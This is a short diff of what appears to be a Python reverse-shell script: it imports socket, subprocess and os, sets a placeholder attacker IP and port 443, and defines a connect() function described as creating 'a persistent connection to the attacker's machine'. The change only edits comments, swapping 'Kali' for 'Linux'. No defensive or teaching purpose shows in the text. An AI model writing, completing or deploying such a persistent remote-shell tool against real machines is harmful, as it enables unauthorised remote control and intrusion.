@@ -2,8 +2,8 @@ import socket
 import subprocess
 import os
 
-IP = "192.x.x.x"  # Change this to your Kali IP
-PORT = 443             # Make sure this port is open on Kali
+IP = "192.x.x.x"    # Change this to your Linux IP
+PORT = 443          # Make sure this port is open on your Linux
 
 def connect():
     """Creates a persistent connection to the attacker's machine."""
